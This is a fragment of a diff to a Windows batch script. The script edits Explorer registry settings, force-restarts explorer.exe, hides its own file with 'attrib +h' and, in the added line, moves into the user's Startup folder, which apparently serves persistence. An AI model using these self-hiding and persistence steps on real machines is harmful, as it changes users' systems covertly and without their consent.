@@ -1,4 +1,3 @@
-ÿþ&cls
 @echo off
 
 cd C:\Users\1664783
@@ -45,6 +44,7 @@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidd
 taskkill /f /im explorer.exe
 start explorer.exe
 ::OPTIONAL: HIDE THE FILE - REMOVE REM TO ENABLE
+cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 attrib +h %~nx0
 ::CODE TO BE RUN ONCE
 if not "%1" == "max" start /MAX cmd /c %0 max & exit/b
